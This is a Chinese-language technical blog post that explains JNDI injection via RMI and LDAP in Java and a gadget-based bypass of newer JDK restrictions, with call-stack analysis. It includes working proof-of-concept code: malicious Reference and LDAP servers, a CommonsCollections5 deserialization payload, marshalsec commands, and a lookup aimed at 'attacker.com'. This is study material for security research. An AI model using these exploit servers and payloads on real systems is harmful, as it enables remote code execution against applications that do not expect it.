---
title: JAVA JNDI注入基础与高版本限制绕过
date: January 2nd 2021
tags: [Java, JNDI, LDAP, 漏洞分析]
summary: Java JNDI 注入基础原理与高版本 JDK 限制绕过，结合 LDAP 协议分析 Fastjson 漏洞链中 JNDI 注入的完整利用过程。
---

# JAVA JNDI注入基础与高版本限制绕过

## 前言

一开始学习Fastjson，发现自己对LDAP这个知识点不是特别了解，进而又是JNDI注入。在学习Fastjson漏洞之前先来学习一下这两个知识。

这篇文章分为以下内容：

- JNDI注入所需的基础知识
- 通过RMI与LDAP进行JNDI注入
- 绕过高版本JDK的限制

## 基础知识

### RMI与LDAP

**RMI**

[JAVA RMI 反序列化攻击 & JEP290 Bypass分析](https://threezh1.com/2020/12/19/JAVA_RMI_Learn/)

**LDAP**

> 目录是一种分布式数据库，目录服务是由目录数据库和一套访问协议组成的系统。LDAP全称是轻量级目录访问协议（The Lightweight Directory Access Protocol），它提供了一种查询、浏览、搜索和修改互联网目录数据的机制，运行在TCP/IP协议栈之上，基于C/S架构。除了RMI服务之外，JNDI也可以与LDAP目录服务进行交互，Java对象在LDAP目录中也有多种存储形式：

- Java序列化
- JNDI Reference
- Marshalled对象
- Remote Location (已弃用)

LDAP可以为存储的Java对象指定多种属性：

- javaCodeBase
- objectClass
- javaFactory
- javaSerializedData…

[LDAP概念和原理介绍](https://www.cnblogs.com/wilburxu/p/9174353.html)

### JNDI原理及使用例子

在BlackHat的那篇JNDI注入PPT里对JNDI有一段描述，我觉得更好理解一些：

- Java Naming and Directory Interface 命名与目录接口
- JNDI提供了一个公共接口来与不同类型的服务作交互(命名与目录服务)
- 命名服务(Naming Service)
  - 命名服务是将名称与值相关联的实体，也称为“绑定(binding)”。
  - 它提供了一种基于名称查找对象的工具，该名称称为“查找(lookup)”或“search”操作。
- 目录服务(Directory Service)
  - 允许存储和查找“目录对象”的特殊类型的命名服务。
  - 目录对象不同于一般对象，因为它可以将属性与对象相关联。
  - 因此，目录服务提供了对对象属性进行操作的扩展功能。

JNDI提供了一组通用的接口可供应用很方便地去访问不同的后端服务，例如 LDAP、RMI、CORBA 等。

![](https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/01/02/16092307280043.jpg)

对于JNDI的一个结构图：

- JNDI提供了一个公共接口来与不同类型的服务作交互(命名与目录服务)
- 命名管理器(The Naming Manager)包含用于创建上下文对象和对象的静态方法。由位置信息引用
- 服务器提供程序接口（SPI）允许JNDI管理不同的服务。

![](https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/01/02/16095740866114.jpg)

在JDNI注入中，我们可以把JNDI理解是一个大接口，LDAP和RMI等服务等服务把资源对象或者方法绑定在固定的远程服务端，JNDI进行统一管理供应用程序进行访问和调用。等会直接看例子会更好理解一些。

一个简单的JNDI例子：

IHello.java

```java
import java.rmi.Remote;
import java.rmi.RemoteException;

public interface IHello extends Remote {
    public String sayHello(String name) throws RemoteException;
}
```

IHelloImpl.java

```java
import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

public class IHelloImpl extends UnicastRemoteObject implements IHello {
    protected IHelloImpl() throws RemoteException {
        super();
    }

    public String sayHello(String name) throws RemoteException {
        return "Hello " + name;
    }
}
```

CallService.java

```java
import javax.naming.Context;
import javax.naming.InitialContext;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.Properties;

public class CallService {
    public static void main(String[] args) throws Exception {
        Properties env = new Properties();
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        env.put(Context.PROVIDER_URL, "rmi://localhost:1099");
        Context ctx = new InitialContext(env);

        Registry registry = LocateRegistry.createRegistry(1099);
        IHello hello = new IHelloImpl();
        registry.bind("hello", hello);

        IHello rHello = (IHello) ctx.lookup("hello");
        System.out.println(rHello.sayHello("RickGray"));
    }
}
```

JNDI获取并调用了远程方法`say.Hello`。

![-w1792](https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/01/02/16093258958546.jpg)

在`CallService`这里对JNDI服务进行了初始化，在初始化配置 JNDI 设置时可以预先指定其上下文环境（RMI、LDAP 或者 CORBA 等)。这里的例子是指定了上下文环境为RMI。  
这个指定是动态的，在调用 lookup() 或者 search() 时，可以使用带 URI 动态的转换上下文环境，例如上面已经设置了当前上下文会访问 RMI 服务，那么可以直接使用 LDAP 的 URI 格式去转换上下文环境访问 LDAP 服务上的绑定对象：

```plain
ctx.lookup("ldap://attacker.com:12345/ou=foo,dc=foobar,dc=com");
```

通过这个例子可以看出，用户只需要使用JNDI，可以跟RMI、LDAP等各种服务进行交互，这样是为了在JAVA中能够更方便的管理、访问和调用远程的资源对象。

JNDI注入就出现在`lookup`方法中，如果`InitialContext.lookup(URI)`中的URL可控，那么就存在JDNI注入漏洞风险。

## JNDI注入

### JNDI注入在不同版本下的限制

随着JDK的升级，不同的利用方式在不同版本下的利用区别可以参考下图：

- JDK 5U45、6U45、7u21、8u121 开始 java.rmi.server.useCodebaseOnly 默认配置为true
- JDK 6u132、7u122、8u113 开始 com.sun.jndi.rmi.object.trustURLCodebase 默认值为false
- JDK 11.0.1、8u191、7u201、6u211 com.sun.jndi.ldap.object.trustURLCodebase 默认为false

![](https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/01/02/16095753735332.jpg)

RMI和LDAP的JDNI注入过程是差不多的，只是在`Reference`的获取上有差异，所以这里以RMI-JDNI为例进行分析。

### 通过RMI与LDAP进行JNDI注入(jdk<8u191)

在`lookup`方法调用过程中对`Reference`类的特殊处理，通过RMI和LDAP所进行的JNDI注入都是基于这个特殊处理来利用的。

通过RMI进行JDNI注入的步骤如下：

1. 攻击者需要构造一个恶意对象，在其构造方法处加入恶意代码。将其上传到服务器中等待远程加载
2. 构造一个恶意RMI服务器，bind一个ReferenceWrapper对象，ReferenceWrapper对象是Reference对象的封装
3. Reference对象中包含了一个远程地址，远程地址中可以加载恶意对象class
4. JNDI在lookup过程中会解析Reference对象并远程加载恶意对象触发漏洞

`javax.naming.Reference`构造方法为：`Reference(String className, String factory, String factoryLocation)`

- className - 远程加载时所使用的类名
- classFactory - 加载的class中需要实例化类的名称
- classFactoryLocation - 提供classes数据的地址可以是file/ftp/http等协议

#### 复现例子

**自己搭建一个RMI服务**

RMIServer.java

```java
import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIServer {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);
        Reference reference = new Reference("testObject", "testObject", "http://127.0.0.1/");
        ReferenceWrapper wrapper = new ReferenceWrapper(reference);
        registry.bind("testObject", wrapper);
        System.out.println("run in 1099");
    }
}
```

在RMI中，一个对象要成为远程对象的话，必须要继承`UnicastRemoteObject`类，因为`Reference`没有实现`Remote`接口也没有继承`UnicastRemoteObject`类，故不能作为远程对象bind到注册中心，所以需要使用ReferenceWrapper对Reference的实例进行一个封装。

JNDIClient.java

```java
import javax.naming.InitialContext;

public class JNDIClient {
    public static void main(String[] args) throws Exception {
        new InitialContext().lookup("rmi://127.0.0.1:1099/testObject");
    }
}
```

当客户端调用`InitialContext().lookup()`方法时，会从`http://127.0.0.1/testObject.class`处获取class并触发构造方法中的恶意代码。

evilObject.java

```java
public class evilObject {
    public evilObject() throws Exception{
        Runtime.getRuntime().exec("open -a Calculator");
    }
}
```

需要注意的是这个类应放在一个无关的目录且不需要加包名，再用`javac evulObject.java`来生成class文件。将class文件放到一个web服务下即可。(例子放在了本地web根目录下)

![-w1790](https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/01/02/16093363362076.jpg)

**使用marshalsec起一个RMI服务**

除了自己搭建一个RMI服务之外，也可以直接使用marshalsec起一个RMI服务：

```plain
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:80/#testObject 7777
```

利用跟上面是一样的。

**使用marshalsec起一个LDAP服务**

```plain
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:80/#testObject 7777
```

LDAP服务就只是把协议名改成ldap即可：

![-w1791](https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/01/02/16093986951767.jpg)

#### 调用链分析

漏洞触发点堆栈：

```plain
getObjectFactoryFromReference(Reference, String):163, NamingManager (javax.naming.spi), NamingManager.java
getObjectInstance(Object, Name, Context, Hashtable):319, NamingManager (javax.naming.spi), NamingManager.java
decodeObject(Remote, Name):456, RegistryContext (com.sun.jndi.rmi.registry), RegistryContext.java
lookup(Name):120, RegistryContext (com.sun.jndi.rmi.registry), RegistryContext.java
lookup(String):203, GenericURLContext (com.sun.jndi.toolkit.url), GenericURLContext.java
lookup(String):411, InitialContext (javax.naming), InitialContext.java
main(String[]):7, JNDIClient (jndi_test1), JNDIClient.java
```

跟入使用例子的`JNDIClient.java`的`lookup`方法：

![-w1000](https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/01/02/16093340610568.jpg)

继续跟入`lookup`方法：

![-w1000](https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/01/02/16093341980228.jpg)

继续跟入这个`lookup`方法：

![-w1000](https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/01/02/16093351522393.jpg)

这里通过调用`this.registry.lookup`获取到了`ReferenceWrapper_Stub`对象，并与`testObject`一起传入了`this.decodeObject`方法：

![-w1000](https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/01/02/16093353067088.jpg)

通过`getReference()`获取到了`Reference`对象，继续跟入`NamingManager.getObjectInstance`：

![-w1000](https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/01/02/16093354611953.jpg)

这里的Ref包含Reference对象的一些信息：

![-w1000](https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/01/02/16093355675102.jpg)

继续跟入`getObjectFactoryFromReference`：

![-w1000](https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/01/02/16093357649087.jpg)

如果本地存在需要获取的类，则会使用`clas = helper.loadClass(factoryName);`在本地直接获取。如果本地不存在，则使用`clas = helper.loadClass(factoryName, codebase);`远程加载类：

![-w1000](https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/01/02/16093359564339.jpg)

这里使用`URLClassLoader`来远程动态加载类。

接着获取到类之后，会在`return`处调用`clas.newInstance()`，会触发类的构造方法。我们把恶意语句写在了构造方法处，所以在这里会被触发执行。

**关于codebase**

> Codebase指定了Java程序在网络上远程加载类的路径。RMI机制中交互的数据是序列化形式传输的，但是传输的只是对象的数据内容，RMI本身并不会传递类的代码。当本地没有该对象的类定义时，RMI提供了一些方法可以远程加载类，也就是RMI动态加载类的特性。  
> Codebase实际上是一个URL表，该URL上存放了接收方需要的类文件。  
> 当接收程序试图从该URL的Webserver上下载类文件时，它会把类的包名转化成目录，在Codebase 的对应目录下查询类文件，如果你传递的是类文件 com.project.test ，那么接受方就会到下面的URL去下载类文件：  
> [http://url:8080/com/project/test.class](http://url:8080/com/project/test.class)

**修复后的限制**

在`JDK 6u132、7u122、8u113`之中对这个利用方式进行了限制，在`decodeObject`方法处新增了一个读`trustURLCodebase`的判断，而这个值默认是为`false`的。

![-w1000](https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/01/02/16093912606124.jpg)

![-w1000](https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/01/02/16093912859163.jpg)

调用会抛出异常 `The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'.`。

![-w1000](https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/01/02/16093919073008.jpg)

**ldap的调用链**

```plain
getObjectFactoryFromReference(Reference, String):146, NamingManager (javax.naming.spi), NamingManager.java
getObjectInstance(Object, Name, Context, Hashtable, Attributes):188, DirectoryManager (javax.naming.spi), DirectoryManager.java
c_lookup(Name, Continuation):1086, LdapCtx (com.sun.jndi.ldap), LdapCtx.java
p_lookup(Name, Continuation):544, ComponentContext (com.sun.jndi.toolkit.ctx), ComponentContext.java
lookup(Name):177, PartialCompositeContext (com.sun.jndi.toolkit.ctx), PartialCompositeContext.java
lookup(String):203, GenericURLContext (com.sun.jndi.toolkit.url), GenericURLContext.java
lookup(String):94, ldapURLContext (com.sun.jndi.url.ldap), ldapURLContext.java
lookup(String):411, InitialContext (javax.naming), InitialContext.java
main(String[]):7, JNDIClient (jndi_test1), JNDIClient.java
```

LDAP的限制是从JDK 11.0.1、8u191、7u201、6u211 开始的，之后的版本`com.sun.jndi.ldap.object.trustURLCodebase`默认为false。

所以`jdk 8u191`之后的的版本，无法通过RMI、LDAP加载远程的Reference工厂类。

### 通过构造恶意反序列化内容触发本地Gadget绕过高版本JDK的限制(jdk>=8u191)

通过构造恶意反序列化内容触发本地Gadget绕过高版本JDK的限制，需要本地存在Gadget可以利用才行，这里用cc5的链来进行分析。

#### 复现例子

pom.xml

```xml
<dependencies>
    <dependency>
        <groupId>com.unboundid</groupId>
        <artifactId>unboundid-ldapsdk</artifactId>
        <version>3.1.1</version>
    </dependency>
    <dependency>
        <groupId>commons-collections</groupId>
        <artifactId>commons-collections</artifactId>
        <version>3.2.1</version>
    </dependency>
</dependencies>
```

LDAPServer.java

```java
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;

public class LDAPServer {
    private static final String LDAP_BASE = "dc=example,dc=com";

    public static void main ( String[] tmp_args ) throws Exception{
        String[] args=new String[]{"http://127.0.0.1:80/#testObject"};
        int port = 7777;

        InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
        config.setListenerConfigs(new InMemoryListenerConfig(
                "listen", //$NON-NLS-1$
                InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                port,
                ServerSocketFactory.getDefault(),
                SocketFactory.getDefault(),
                (SSLSocketFactory) SSLSocketFactory.getDefault()));

        config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ])));
        InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
        System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
        ds.startListening();
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private URL codebase;

        public OperationInterceptor ( URL cb ) {
            this.codebase = cb;
        }

        @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }
        }

        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws Exception {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
            e.addAttribute("javaClassName", "foo");
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if ( refPos > 0 ) {
                cbstring = cbstring.substring(0, refPos);
            }

            e.addAttribute("javaSerializedData",CommonsCollections5());

            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }

    private static byte[] CommonsCollections5() throws Exception{
        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[]{}}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[]{}}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"open -a Calculator"})
        };

        ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);
        Map map=new HashMap();
        Map lazyMap=LazyMap.decorate(map,chainedTransformer);
        TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,"test");
        BadAttributeValueExpException badAttributeValueExpException=new BadAttributeValueExpException(null);
        Field field=badAttributeValueExpException.getClass().getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttributeValueExpException,tiedMapEntry);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(badAttributeValueExpException);
        objectOutputStream.close();

        return byteArrayOutputStream.toByteArray();
    }
}
```

这个POC修改自：[LDAPRefServer.java](https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java) 

同样使用之前的JNDIClient进行`lookup`操作触发漏洞：

![-w1791](https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/01/02/16094015836593.jpg)

#### 调用链分析

通过POC来看这个漏洞是如果被调用的，最终的调用栈如下：

```plain
deserializeObject(byte[], ClassLoader):532, Obj (com.sun.jndi.ldap), Obj.java
decodeObject(Attributes):239, Obj (com.sun.jndi.ldap), Obj.java
c_lookup(Name, Continuation):1051, LdapCtx (com.sun.jndi.ldap), LdapCtx.java
p_lookup(Name, Continuation):542, ComponentContext (com.sun.jndi.toolkit.ctx), ComponentContext.java
lookup(Name):177, PartialCompositeContext (com.sun.jndi.toolkit.ctx), PartialCompositeContext.java
lookup(String):205, GenericURLContext (com.sun.jndi.toolkit.url), GenericURLContext.java
lookup(String):94, ldapURLContext (com.sun.jndi.url.ldap), ldapURLContext.java
lookup(String):417, InitialContext (javax.naming), InitialContext.java
main(String[]):7, JNDIClient (jndi_test1), JNDIClient.java
```

前面的一些变量传递就不看了，主要来看`c_lookup`方法处：

![-w1387](https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/01/02/16094890483818.jpg)

这里先通过`this.doSearchOnce`获取到`LdapResult对象`，里面包含了poc里面所传递的对象：

![-w808](https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/01/02/16094891282776.jpg)

在693行有了一个判断，判断var4是否有`javaClassName`这个Attribute。

![-w1000](https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/01/02/16094893333224.jpg)

如果有的话，则进入`Obj.decodeObject`这个方法：

![-w1000](https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/01/02/16094895708716.jpg)

这里又有一个判断，判断var0是否有`javaSeralizedData`这个Attribute。有的话就传入到`deserializeObject`进行反序列化。

![-w1051](https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/01/02/16094896717514.jpg)

所以只要满足这两个条件，并且`javaSeralizedData`这个Attribute的值是一个序列化后的恶意对象，就可以进行利用了。可以看到POC中是设置了这两个Attribute的：

```java
protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws Exception {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
            e.addAttribute("javaClassName", "foo"); // 设置javaClassName
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if ( refPos > 0 ) {
                cbstring = cbstring.substring(0, refPos);
            }

            e.addAttribute("javaSerializedData",CommonsCollections5()); // 设置了javaSerializedData

            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }
```

### 利用本地Class作为Reference Factory(待学习)

由于环境依赖存在问题一直没解决，下面的库没找到安装的方法。这个利用方式就先放一下。如果有师傅遇到同样的问题并且解决了的话，希望师傅可以分享一下解决的办法~

```xml
<!-- https://mvnrepository.com/artifact/org.apache.el/com.springsource.org.apache.el -->
<dependency>
    <groupId>org.apache.el</groupId>
    <artifactId>com.springsource.org.apache.el</artifactId>
    <version>7.0.26</version>
</dependency>
```

简单理解这个利用方式：寻找本地的CLASSPATH中的一个工厂类，工厂类需要实现 javax.naming.spi.ObjectFactory 接口，并且至少存在一个 getObjectInstance() 方法。存在于Tomcat依赖包中的org.apache.naming.factory.BeanFactory的这个包正好满足这个条件。再根据这个类中的一些解析特性最后利用`java.el.ELProcessor`构造EL表达式达到命令执行。

参考：

- Exploiting JNDI Injections in Java
- 如何绕过高版本JDK的限制进行JNDI注入利用

## 参考

- BlackHat 2016 回顾之 JNDI 注入简单解析
- JNDI注入学习
- A JOURNEY FROM JNDI/LDAP MANIPULATION TO REMOTE CODE EXECUTION DREAM LAND
- 如何绕过高版本JDK的限制进行JNDI注入利用
- Java安全-JNDI-学习总结